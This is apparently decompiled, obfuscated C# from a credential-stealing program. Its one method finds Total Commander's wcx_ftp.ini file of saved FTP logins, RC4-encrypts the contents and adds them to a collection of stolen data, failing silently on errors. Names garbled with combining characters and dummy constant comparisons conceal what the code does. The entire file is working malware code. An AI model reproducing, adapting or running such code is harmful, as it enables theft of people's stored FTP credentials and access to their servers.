using System;
using System.IO;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000006 RID: 6
	internal class Class_3
	{
		// Token: 0x0600000D RID: 13 RVA: 0x000023A4 File Offset: 0x000005A4
		public static void tmethod_2(string str_0)
		{
			try
			{
				string text = Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold + "\\GHISLER\\";
				FileInfo[] files = new DirectoryInfo(text).GetFiles();
				int num2;
				int num = num2 = -4;
				if (718602305 == 718602305)
				{
					num2 = num + 4;
				}
				int num6;
				int num8;
				for (int i = num2; i < files.Length; i = num6 + num8)
				{
					if (files[i].Name.Contains("wcx_ftp.ini"))
					{
						Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + "\\FTP\\Total Commander\\wcx_ftp.ini", Class_47.RC4(File.ReadAllBytes(text + "wcx_ftp.ini")));
						int num3 = Class_3.field_0;
						int num5;
						int num4 = num5 = -3;
						if (1457542474 == 1457542474)
						{
							num5 = num4 + 4;
						}
						Class_3.field_0 = num3 + num5;
					}
					num6 = i;
					int num7 = num8 = -3;
					if (2044777900 == 2044777900)
					{
						num8 = num7 + 4;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000010 RID: 16
		public static int field_0;
	}
}
